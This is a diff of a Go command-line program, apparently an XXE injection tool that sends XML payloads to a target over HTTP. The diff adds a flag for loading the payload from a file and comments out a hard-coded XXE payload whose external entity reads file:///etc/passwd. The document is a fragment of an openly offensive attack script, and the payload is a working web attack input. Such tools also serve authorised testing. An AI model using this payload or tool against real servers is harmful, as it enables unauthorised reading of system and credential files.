@@ -16,17 +16,27 @@ func main() {
 
 	// Define the timeout flag
 	timeout := flag.Int("t", 30, "The timeout for the HTTP request in seconds")
+	
+	// Define the payload flag
+        payloadFile := flag.String("p", "", "The file containing the XML payload")
 
 	// Parse the command line flags
 	flag.Parse()
+	
+	// Read the payload from the specified file
+        payload, err := ioutil.ReadFile(*payloadFile)
+        if err != nil {
+            fmt.Println("Error reading payload file:", err)
+            return
+        }
 
 	// Create an XML payload with an XXE injection
-	payload := `
-		<!DOCTYPE foo [
-		<!ELEMENT foo ANY >
-		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-		<foo>&xxe;</foo>
-	`
+// 	payload := `
+// 		<!DOCTYPE foo [
+// 		<!ELEMENT foo ANY >
+// 		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+// 		<foo>&xxe;</foo>
+// 	`
 
 	// Create a new HTTP client with the specified timeout
 	client := &http.Client{
